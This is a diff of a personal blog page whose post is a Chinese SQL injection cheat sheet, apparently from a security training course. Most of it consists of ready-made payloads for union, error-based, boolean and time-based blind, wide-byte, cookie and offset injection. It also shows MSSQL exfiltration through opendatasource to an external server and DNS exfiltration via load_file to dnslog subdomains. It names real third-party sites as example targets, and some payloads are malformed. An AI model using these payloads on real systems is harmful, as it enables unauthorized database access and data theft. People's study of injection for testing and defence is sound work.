@@ -4,7 +4,7 @@
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">archive_a: 2021 | 小破水站</title>
+  <title itemprop="name">sql注入（自查自用） | 小破水站</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -375,94 +375,453 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 75px;">
-</div>
-<div id="content" class="site-content">
-  <div id="main">
-    <header class="page-header">
-      <h1 class="cat-title">
-      归档</h1>
-      <span class="cat-des">
-        <p>
-        Archives</p>
-      </span>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://blog-1305208649.cos.ap-beijing.myqcloud.com/d940a02861b90cf85a32800d32d77dca8b02e074.jpg@1320w_926h.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://blog-1305208649.cos.ap-beijing.myqcloud.com/d940a02861b90cf85a32800d32d77dca8b02e074.jpg@1320w_926h.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      sql注入（自查自用）</h1>
+      <p class="entry-census">
+        <span>
+          <a href="laoliang.shop">
+            <img src="https://cdn.jsdelivr.net/gh/bloghexo123/CDNNAME/img/bcaeef1ffbc2bed0120e9bad50e79a66.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="laoliang.shop">老梁</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-5-31<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
-    <div id="main-part">
-      <article class="art">
-        <div class="art-main">
-          <div class="art-content">
-            <div id="archives">
-              <p style="text-align:right;">
-                [<span id="al_expand_collapse" style="cursor: s-resize;">
-                全部展开/收缩</span>
-              ]</p>
-              
-              
-              
-              
-              
-                
-                <h3 class="al_year">2021年</h3>
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      05月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2021/05/21/sql%E6%B3%A8%E5%85%A5%EF%BC%88%E9%80%9F%E6%9F%A5%E8%87%AA%E7%94%A8%EF%BC%89/">
-                          <span style="color:#0bf;">
-                          21日08:20:48</span>
-                          sql注入（速查自用）
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
-              
-              
-              
-                
-                <h3 class="al_year">2020年</h3>
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      05月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2020/05/31/%E5%8D%8E%E4%B8%BA%E8%B7%AF%E7%94%B1%E5%99%A8/">
-                          <span style="color:#0bf;">
-                          31日10:20:01</span>
-                          网络配置与运维笔记
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p><img src="https://blog-1305208649.cos.ap-beijing.myqcloud.com/d940a02861b90cf85a32800d32d77dca8b02e074.jpg@1320w_926h.jpg" alt="d940a02861b90cf85a32800d32d77dca8b02e074.jpg@1320w_926h"></p>
+<pre class=" language-html"><code class="language-html">
+```plain
+1.但凡是表单类型，请特别注意是or不是and开头
+</code></pre>
+<h2 id="一-注入点"><a href="#一-注入点" class="headerlink" title="一.注入点:"></a><strong>一.注入点:</strong></h2><table>
+<thead>
+<tr>
+<th align="left"><strong>1.表单</strong></th>
+<th align="left"><strong>2.搜索</strong></th>
+<th align="left"><strong>3.留言板</strong></th>
+<th align="left">4.<strong>注册</strong></th>
+<th align="left"><strong>5.登录</strong></th>
+</tr>
+</thead>
+</table>
+<h3 id="1-表单："><a href="#1-表单：" class="headerlink" title="1.表单："></a><strong>1.表单：</strong></h3><p>图片类型：</p>
+<p>①我们选择ID，观察是否有参数变化，直接采取抓包。</p>
+<h3 id="2-搜索框："><a href="#2-搜索框：" class="headerlink" title="2.搜索框："></a><strong>2.搜索框：</strong></h3><pre class=" language-plain"><code class="language-plain">a%' and 1=1 --+ 正常 
+a%' and 1=2 --+ 错误
+</code></pre>
+<p><strong>3.注册板块****：</strong></p>
+<pre class=" language-plain"><code class="language-plain">注意使用报错注入(updatexml)可能概率比较大；测试示范语句： 
+1' and UpdateXML(1,concat('~',database()),1))#
+</code></pre>
+<p><strong>4.留言板模块</strong>：</p>
+<p>注意也是使用报错注入，但是注入点出现的原因，是因为点击删除以后的返回包.</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="5-登录模块：略"><a href="#5-登录模块：略" class="headerlink" title="5.登录模块：略"></a>5.<strong>登录模块：略</strong></h4><h2 id="二-伪静态"><a href="#二-伪静态" class="headerlink" title="二.伪静态:"></a><strong>二.伪静态:</strong></h2><p>1.是否为伪静态的判断方法：document.lastmodified可以检测网页是否静态，如果时间不变，就是静态页面，如果静态网页，就无法sql注入，但有伪静态（动态）</p>
+<pre class=" language-plain"><code class="language-plain">第一种：
+原来：http://www.hbdedu.cn/showarticle_55.html
+改变：http://www.hbdedu.cn/showarticle.php?id=55 （jsp,asp,php)
+第二种：
+原来：http://zcb.sxjigjt.com.cn/index.php/Index/Ndetails/class/news/htmIs/moving/id/128.html
+改变：http://zcb.sxjigjt.com.cn/index.php/Index/Ndetails/class/news/htmIs/moving/id/1280 and 1=1
+</code></pre>
+<h2 id="判断网页数据库："><a href="#判断网页数据库：" class="headerlink" title="判断网页数据库："></a>判断网页数据库：</h2><pre class=" language-plain"><code class="language-plain">asp对应access
+php对应mysql\oracle\mssql
+aspx对应mssql
+jsp对应Oracle、MySQL
+</code></pre>
+<h2 id="post注入：【速查表】"><a href="#post注入：【速查表】" class="headerlink" title="post注入：【速查表】"></a>post注入：【速查表】</h2><pre class=" language-plain"><code class="language-plain">确认字段数：' or 1=1 order by 3 -- qwe
+找回显：' union select 1,2,3 -- qwe
+爆库：' union select 1,database(),3 -- qwe
+爆表：' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='post_error' -- qwe
+爆字段：' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag' -- qwe
+爆字段内容：' union select 1,group_concat(id,0x7e,flag),3 from flag -- qwe
+</code></pre>
+<h2 id="header注入（报错注入）【速查表】"><a href="#header注入（报错注入）【速查表】" class="headerlink" title="header注入（报错注入）【速查表】"></a>header注入（报错注入）【速查表】</h2><p>分别对UA和REFERER和X-Forwarded-For，    X-Forwarded-For切记放在Origin下面</p>
+<pre class=" language-plain"><code class="language-plain">获取数据库名：'or updatexml(1,concat(0x7e,(select database())),1),1) -- qwe
+获取表名：'or updatexml(1,concat('!',(select group_concat(table_name) from  information_schema.tables where table_schema=database())),1),1)  -- qwe
+查字段数:' or updatexml(1,concat('!',(select column_name from  information_schema.columns where table_name='flag_head' limit  0,1)),1),1) -- qwe
+查字段内容：' or updatexml(1,concat('!',(select group_concat(id,0x7e,flag_h1) from flag_head)),1),1) -- qwe
+</code></pre>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="布尔盲注【速查表】"><a href="#布尔盲注【速查表】" class="headerlink" title="布尔盲注【速查表】"></a>布尔盲注【速查表】</h2><h4 id="涉及到的函数："><a href="#涉及到的函数：" class="headerlink" title="涉及到的函数："></a>涉及到的函数：</h4><p>length()：函数 返回字符串的长度</p>
+<p>substr()： 截取字符串</p>
+<p>ascii() ：返回字符的ascii码  ，ascii码128个</p>
+<pre class=" language-plain"><code class="language-plain">测数据库长度:and length(database())>1 -- qwe
+爆破数据库名称:and ascii(substr(database(),1,1))=107 -- qwe[burp:第4个爆破模式 Cluster bomb,而下划线标注的地方必须以之前测出的数据库长度]
+测表长度:and length((select table_name from information_schema.tables where table_schema='kanwolongxia' limit 0,1))>1 -- qwe
+爆库表名and ascii(substr((select table_name from  information_schema.tables where table_schema='kanwolongxia' limit  0,1),1,1))=1 -- qwe
+测字段数:and 1=1 order by 1 -- qwe
+测字段长度: and length((select column_name from  information_schema.columns where table_name='loflag' and  table_schema=database() limit 0,1))>1 -- qwe
+爆字段名:and ascii(substr((select column_name from  information_schema.columns where table_name='loflag' and  table_schema=database() limit 0,1),1,1))=102 -- qwe
+测flag长度 ：and length((select flaglo from loflag limit 0,1))>1 -- qwe
+爆flag名：and ascii(substr((select flaglo from loflag limit 0,1),1,1))=1
+</code></pre>
+<p>假如碰到了表单【登录，注册】方式提交，必须以’ or开头；’ or length(database())&gt;1 – qwe</p>
+<h2 id="时间盲注【速查表】"><a href="#时间盲注【速查表】" class="headerlink" title="时间盲注【速查表】"></a>时间盲注【速查表】</h2><ol>
+<li>length()函数返回字符串的长度</li>
+<li>substr()截取字符串（语法:SUBSTR(str,pos,len);）</li>
+<li>ascii()返回字符的ascii码[将字符变为数字wei]</li>
+<li>sleep()将程序挂起一段时间n为n秒</li>
+<li>if(expr1,expr2,expr3)判断语句如果第一个语句正确就执行第二个语句如果错误执行第三个语句<pre class=" language-plain"><code class="language-plain">测数据库长度:and if(length(database())>1,sleep(10),1) -- qwe
+爆破数据库名称:and if(ascii(substr(database(),1,1))=107,sleep(10),1) -- qwe
+测表长度and if(length((table_name from information_schema.tables where table_schema=database() limit 0,1))>1,sleep(10),1) -- qwe
+爆库表名and if(ascii(substr((table_name from  information_schema.tables where table_schema=database() limit  0,1),1,1))=107,sleep(10),1) -- qwe
+测字段数:and if(length((column_name from information_schema.columns  where table_schema=database() and table_name='admin' limit  0,1))>1,sleep(10),1) -- qwe
+爆字段名:and if(ascii(substr((column_name from  information_schema.columns where table_schema=database() and  table_name='admin' limit 0,1),1,1))=107,sleep(10),1) -- qwe
+测flag长度 ：and if(length((username from admin  limit 0,1))>1,sleep(10),1) -- qwe
+爆flag名:and if(ascii(substr((and if(ascii(substr(database(),1,1))=107,sleep(10),1) -- qwe),1,1))=107,sleep(10),1) -- qwe
+</code></pre>
+</li>
+</ol>
+<h2 id="宽字节注入【速查表】："><a href="#宽字节注入【速查表】：" class="headerlink" title="宽字节注入【速查表】："></a>宽字节注入【速查表】：</h2><pre class=" language-plain"><code class="language-plain">查字段数：%df' and 1=1 order by 3 -- qwe
+找回显点：%df' and 1=1 union select 1,2,3 -- qwe
+查数据库名：%df' and 1=1 union select 1,database(),3 -- qwe
+查表：%df' and 1=1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- qwe
+查字段；%df'  and 1=1 union select 1,group_concat(column_name),3 from  information_schema.columns where table_name=0x6368696e615f666c6167 --  qwe
+得数据：%df' and 1=1 union select 1,group_concat(C_Flag),3 from china_flag -- qwe
+如果碰到post提交；需要将其该回去，通过burp抓包来判断是否需要修改
+盲注结合宽字节注入：
+查数据库：%df') or length(database())=8 -- qwe
+                 %df') or ascii(substr(database(),1,1))=1
+查表：%df') or length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=10 -- qwe
+%df') or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=10 -- qwe
+ 查字段：%df') or length((select column_name from  information_schema.columns where table_name=0x6368696e615f666c6167 limit  1,1))=10 -- qwe
+%df') or ascii(substr((select column_name from  information_schema.columns where table_name=0x6368696e615f666c6167 limit  1,1),1,1))=10 -- qw
+查结果：
+%df') or length((select C_Flag from china_flag limit 1,1))=10 -- qwe
+ %df') or ascii(substr((select C_Flag from china_flag limit 2,1),1,1))=10 -- qwe 
+</code></pre>
+<h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="cookie注入【速查表】注意url编码【有毛病】"><a href="#cookie注入【速查表】注意url编码【有毛病】" class="headerlink" title="cookie注入【速查表】注意url编码【有毛病】"></a>cookie注入【速查表】注意url编码【有毛病】</h2><p>什么网站存在cookie注入</p>
+<p>1.asp网站存在性极高</p>
+<p>2.PHP版本低于5.3可能性极高</p>
+<p>Exist()函数判断括号内的值:</p>
+<p>有数据==&gt;TURE</p>
+<p>无数据==&gt;FALSE</p>
+<p>escape;url编码</p>
+<pre class=" language-plain"><code class="language-plain">==>select exist(select*from admin) 
+  171 and exists(select*from admin) 
+  171 and exists(select username from admin) 
+  171 and exists(select password from admin)
+  将?id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin或者?id=171 union select 1,2,3,4,5,6,7,8,9,10 from user
+注：admin和user表示猜的，是通常情况下的习惯表名,测得有表为admin
+  猜里面有字段username和 password
+或者document.cookie="id="+escape("171 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin)")
+</code></pre>
+<h2 id="偏移注入-移位溢注-Access"><a href="#偏移注入-移位溢注-Access" class="headerlink" title="偏移注入|移位溢注  -Access"></a>偏移注入|移位溢注  -Access</h2><pre class=" language-plain"><code class="language-plain">攻击例子：document.cookie="id="+escape("105")
+  
+                  document.cookie="id="+escape("171 order by 10")
+  
+测字段数：order by 10
+  
+判断回显点：union select 1,2,3,4,5,6,7,8,9,admin.* from admin
+  
+判断是否可以使用偏移注入：union select 1,admin.* from admin（如果报错，就不能使用偏移注入）——数据库错误，换了
+  
+继续判断回显点 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26* from admin
+  
+可以ctrl+u，加上ctrl+f查找回显点，后面加上特定的数字字母
+  
+例:测试admin是否只有一个字段
+select 1,2,3,4,5,6,7,8,9,admin.※ from admin
+测试admin是否有两个字段
+select 1,2,3,4,5,6,7,admin.※ from admin
+测试admin是否有三个字段
+select 1,2,3,4,5,6,7,admin.※ from admin
+依次测试即可
+最后发现
+select admin.※ from admin 页面都显示不正常，说明这个admin表中的字段数大于这个注入点的字段数，这个注入点无法进行移位溢注
+  直到：union select 1,2,3,4,5,6,7,8,9,10,admin.* from admin
+</code></pre>
+<h2 id="mssql-反弹注入"><a href="#mssql-反弹注入" class="headerlink" title="mssql-反弹注入"></a>mssql-反弹注入</h2><p><strong>mssql——sqlsever的反弹注入，相比于dns注入不需要改配置就能用，其他数据库都可以使用，但函数不一样，这次教的只适用于sqlsevermssql反弹注入使用场景：明明是sql的注射点却无法进行注射等等一些问题，最好使用反弹注射技术，而反弹注射技术需要opendatasource函数的支持我查询到的数据，插入到其他数据库</strong></p>
+<p><strong>查所有的表</strong>：</p>
+<p>select name from dbo.sysdatabases</p>
+<p><strong>查用户创建表并且该表的id</strong></p>
+<p>select name,id from dbo.sysobjects where xtype=’U’</p>
+<p><strong>查字段</strong>【需要根据查表的时候表的id值】</p>
+<p>select name,id from dbo.syscolumns where id=245575913</p>
+<p><strong>反弹注入条件</strong>：</p>
+<p>1、有堆叠注入(MSSQL)</p>
+<p>2、目标有外网环境</p>
+<p>3.支持opendatasource函</p>
+<p><strong>反弹语句解析</strong></p>
+<blockquote>
+<p>insert into  opendatasource(‘sqloledb’,’server=SQL5009.webweb.com,1433;uid=DB_14A5E44_zkaq_admin;pwd=zkaqzkaq;database=DB_14A5E44_zkaq’).DB_14A5E44_zkaq.dbo.temp  select * from admin —<br>server=连接地址,端口;uid=用户名;pwd=密码;database=数据库名称</p>
+</blockquote>
+<pre class=" language-plain"><code class="language-plain">第一种方法：联合查询
+  
+联合注入：有系统自带表 sysobjects（所有的表） xtype下的u代表用户创建，而s代表系统所创建的
+  
+1.找注入点
+  
+?id=1 and 1=1 -- qwe
+  
+?id=1' and 1=1 -- qwe页面返回正常，测字段
+  
+2.找字段数
+  
+?id=1' order by 3 -- qwe测得字段数为3
+  
+3.找回显
+  
+?id=1' and 1=2 union select 1,2,3 -- qwe页面返回错误,可能是数据类型错误，所以用null测试
+?id=1' and 1=2 union select null,null,null -- qwe页面返回正常
+然后慢慢测字段类型
+?id=1' and 1=2 union select 1,null,null -- qwe返回正常
+最后测的，第一个字段是数字型，后两个数字字符串都可以
+?id=1' and 1=2 union select 1,2,'b' -- qwe
+  
+4.查表名
+  
+?id=1' and 1=2 union select 1,name,id from sysobjects where xtype='U' -- qwe
+  
+查得表名为admin,news,dtproperties
+  
+5.查字段名
+  
+?id=1' and 1=2 union select 1,name,id from syscolumns where id=1977058079 -- qwe
+  
+查得表名为id,passwd,token,username
+  
+6.得flag
+  
+?id=1' and 1=2 union select 1,passwd,token from admin -- qwe
+flag为zkaq&#123;e9c9e67c5&#125;
+  
+第二种方法：
+  
+Insert into 很明显是插入语句 然后出现了个opendatasource。
+  
+opendatasource 为了方便理解，可以看理解为 ‘使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。
+  
+语法：OPENDATASOURCE(provider_name,init_string)provider_name  注册为用于访问数据源的OLE DB 提供程序的PROGID的名称                 
+  
+MSSQL的名称为SQLOLEDBinit_string  连接字符串  连接地址、端口、用户名、密码、数据库名   server=连接地址,端口;uid=用户名;pwd=密码;database=数据库名称  连接上服务器后选定数据表DB_14A5E44_zkaq.dbo.temp   把后面语句的查询结果插入到那个表里面
+  
+?id=1';insert into  opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DBDD4_abcc_admin;pwd=asdasdsadsad;database=DB_14DBDD4_abcc').DB_14DBDD4_abcc.dbo.temp  select name,id from sysobjects where xtype='U' -- qwe
+  
+?id=1';insert into  opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DBDD4_abcc_admin;pwd=asdasdsadsad;database=DB_14DBDD4_abcc').DB_14DBDD4_abcc.dbo.temp  select name,id from syscolumns where id=1977058079 -- qwe
+和?id=1';insert  into  opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DBDD4_abcc_admin;pwd=asdasdsadsad;database=DB_14DBDD4_abcc').DB_14DBDD4_abcc.dbo.temp  select passwd,token from admin -- qwe
+  
+</code></pre>
+<h2 id="Oracle报错注入【速查表】"><a href="#Oracle报错注入【速查表】" class="headerlink" title="Oracle报错注入【速查表】:"></a>Oracle报错注入【速查表】:</h2><p>Dual 是一个实表（但也可以说它是虚表），如果你直接查询它，它只显示一个x,列名为DUMMY,我觉的只不过可以当成不存在，有dual表肯定是Oracle，他是特有的</p>
+<p>select * from all_tables（查出所有的表）；</p>
+<p>select * from user_tables（查出当前用户的表）；</p>
+<p>select * from all_tab_columns（查出当前用户的字段）；</p>
+<p>select * from user_tab_columns（查出当前用户的字段）；</p>
+<p>select * from v$version（查版本）</p>
+<p>rownum=1或者rownum&lt;1，类似于MySQL里面的limit语句【限制查询返回的总行数为一条】</p>
+<p>报错注入语法</p>
+<p>1=ctxsys.drithsx.sn(用户名，(查询语句))</p>
+<blockquote>
+<p>为什么需要1=？<br>因为Oracle的语言严谨，where后面跟的都是条件，单独的字符串不能作为条件，比较才能作为条件，存在的字段名等于这个字符串也可以作为条件。</p>
+</blockquote>
+<pre class=" language-plain"><code class="language-plain">1.找注入点
+  
+?id=1 and 1=1 -- qwe
+  
+?id=1 and 1=2 -- qwe
+  
+2.查字段数
+  
+?id=1 order by 5 -- qwe
+  
+3.找回显点:
+  
+?id=1 and 1=2 union select 1,2,3,4 from dual -- qwe用到了实表dual
+  
+页面返回结果错误，猜测是字段类型错误，使用null猜字段?id=1 and 1=2 union select null,null,null,null from dual -- qwe页面返回正常并且出现回显，但不确定是哪一个回显点，继续测试
+  
+?id=1 and 1=2 union select 1,null,null,1 from dual -- qwe 经过测试，发现第一个字段类型是数字，猜测可能是id，第二个和第三个猜不到，第四个与页面返回的日期回显有关联，所以是一个注入点,然后由两种做法
+  
+做法一：
+  
+即通过函数to_nchar()将第二个和第三个字段类型转换为varchar，即测得第二个和第三个字符串类型可能为NVARCHAR2
+  
+?id=1 and 1=2 union select 1,to_nchar('a'),null,1 from dual -- qwe
+  
+页面返回回显点，所以第二个字段类型应该为NVARCHAR2，此处可当做回显点注入
+  
+4.找表名
+  
+?id=1 and 1=2 union select 1,to_nchar(table_name),null,1 from all_tables -- qwe
+表名为ADMIN
+  
+继续通过这种方法
+?id=1 and 1=2 union select 1,to_nchar(table_name),null,1 from user_tables where table_name<>'ADMIN' -- qwe
+?id=1  and 1=2 union select 1,to_nchar(table_name),null,1 from user_tables  where table_name<>'ADMIN' and table_name<>'MD5' -- qwe
+测得全部表名为ADMIN,MD5,NEWS
+  
+5.找字段名
+  
+猜测最终结果在ADMIN表里面，所以只对ADMIN表找字段
+?id=1 and 1=2 union select 1,to_nchar(column_name),null,1 from all_tab_columns where table_name='ADMIN' -- qwe找到字段UNAME
+同样方法找字段
+?id=1  and 1=2 union select 1,to_nchar(column_name),null,1 from  all_tab_columns where table_name='ADMIN' and  column_name<>'UNAME' -- qwe得到UPASS
+最终测得所有字段为UNAME,UPASS
+  
+6.找到flag
+  
+?id=1 and 1=2 union select 1,to_nchar(UNAME),null,1 from ADMIN-- qwe得到NF
+?id=1 and 1=2 union select 1,to_nchar(UPASS),null,1 from ADMIN-- qwe得md5加密的字符串
+  
+做法2：报错注入；CTXSYS.DRITHSX.SN(user,(select banner from v$version where  rownum=1))  去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询的内容）
+  
+为什么有and 1=,固定的，也可以2=，3=，id=
+  
+即没有合适的输出点
+所以要通过一个函数ctxsys.drithsx.sn()，
+用法：and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1))--  查询数据库版本
+  
+4.找表名
+  
+?id=1 and id=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1))-- qwe
+得到ADMIN表
+  
+同样的方法
+?id=1 and id=ctxsys.drithsx.sn(1,(select table_name from user_tables where table_name<>'ADMIN' and rownum=1))-- qwe得到表NEWS
+  
+?id=1 and id=ctxsys.drithsx.sn(1,(select table_name from user_tables  where table_name<>'ADMIN' and table_name<>'NEWS'and  rownum=1))-- qwe得到表MD5
+  
+5.找字段名
+  
+?id=1 and id=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name='ADMIN' and rownum=1))-- qwe
+得到字段UNAME
+  
+同样方法
+?id=1 and id=ctxsys.drithsx.sn(1,(select column_name from  user_tab_columns where table_name='ADMIN' and  column_name<>'UNAME'and rownum=1))-- qwe得到UPASS
+  
+6.得flag
+  
+?id=1 and id=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1))-- qwe
+  
+</code></pre>
+<h2 id="Dns注入【速查表】【未测验】"><a href="#Dns注入【速查表】【未测验】" class="headerlink" title="Dns注入【速查表】【未测验】"></a>Dns注入【速查表】【未测验】</h2><p>工具;<a target="_blank" rel="noopener" href="https://www.dnslog.cn/">https://www.dnslog.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="https://dnslog.io/?fileGuid=yKjjykV6y38CWXYx">https://dnslog.io/</a></p>
+<p>LOAD_FILE()   读取文件的函数</p>
+<blockquote>
+<p>读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回  NULL</p>
+</blockquote>
+<p><strong>注：</strong>利用读取注入的报错信息，然后返回报错信息(显错注入)</p>
+<p>UNC路径</p>
+<blockquote>
+<p>通用命名规则，也称通用命名规范、通用命名约定。<br>UNC路径就是类似\softer这样的形式的网络路径。它符合 \servername\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称<br>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename</p>
+</blockquote>
+<p>判断注入点：?id=1 and 1=1 – qwe</p>
+<p>所以使用老师上课讲的一种Apache特性[读取文件从后往前读，若读取到的文件格式不对，则读取/前面的文件]来绕过，此处去取的是index3.php</p>
+<pre class=" language-plain"><code class="language-plain">判断注入点：/index3.php/.txt?id=1 and 1=1 -- qwe
+  
+测字段数：/index3.php/.txt?id=1 order by 3 -- qwe
+  
+测回显：/index3.php/.txt?id=1 union select 1,2 from admin-- qwe
+  
+测数据库名：/index3.php/.txt?id=1 and (select load_file(concat('//',database(),'.3ohkma.dnslog.cn/abc')))
+  
+测表名：/index3.php/.txt?id=1 and (select  load_file(concat('//',(select table_name from information_schema.tables  where table_schema=database() limit 0,1),'.3ohkma.dnslog.cn/abc')))
+  
+测字段名：/index3.php/.txt?id=1 and (select  load_file(concat('//',(select column_name from  information_schema.columns where table_name='admin' limit  3,1),'.3ohkma.dnslog.cn/abc')))
+测字段内容：/index3.php/.txt?id=1 and (select load_file(concat('//',(select password from admin limit 1,1),'.3ohkma.dnslog.cn/abc')))
+</code></pre>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/bloghexo123/CDNNAME/img/custom/donate/AliPayQR.jpg"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/bloghexo123/CDNNAME/img/custom/donate/WeChanQR.jpg"></li>
+              </ul>
             </div>
           </div>
         </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
       </article>
-    </div>
-  </div>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2020/05/31/%E5%8D%8E%E4%B8%BA%E8%B7%AF%E7%94%B1%E5%99%A8/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/bloghexo123/CDNNAME/img/e6d1615cb5395cf4ba096e6359e618c815c6184e.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/bloghexo123/CDNNAME/img/e6d1615cb5395cf4ba096e6359e618c815c6184e.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                网络配置与运维笔记</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "utbBncAytlRaYWwpoC2FVqjT-gzGzoHsz",
+        appKey: "40fPh3p6TPvAdQtXSYHPQ8wX",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="laoliang.shop" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/bloghexo123/CDNNAME/img/bcaeef1ffbc2bed0120e9bad50e79a66.jpg" itemprop="image" alt="老梁" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="laoliang.shop" itemprop="url" rel="author">老梁</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>一介菜狗</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
